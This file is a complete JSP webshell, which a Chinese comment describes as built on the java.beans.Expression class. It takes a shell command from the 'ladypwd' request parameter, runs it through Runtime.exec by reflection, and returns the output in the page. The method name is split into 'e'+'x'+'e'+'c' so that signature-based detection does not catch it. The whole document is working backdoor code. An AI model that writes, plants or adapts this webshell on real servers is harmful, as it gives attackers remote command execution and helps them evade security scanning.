<%@ page import="java.beans.Expression" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用Expression类实现JSP Webshell
--%>
<%
    String cmd = request.getParameter("ladypwd");
    Expression expr = new Expression(Runtime.getRuntime(), "e"+"x"+"e"+"c", new Object[]{cmd});
    Process p = (Process)expr.getValue();
    InputStream is = p.getInputStream();
    StringBuilder sb = new StringBuilder();
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    String line;
    while((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
    out.print("<pre>");
    if (sb.length() > 0) {
        out.print(sb.toString());
    }
    out.print("</pre>");
%>
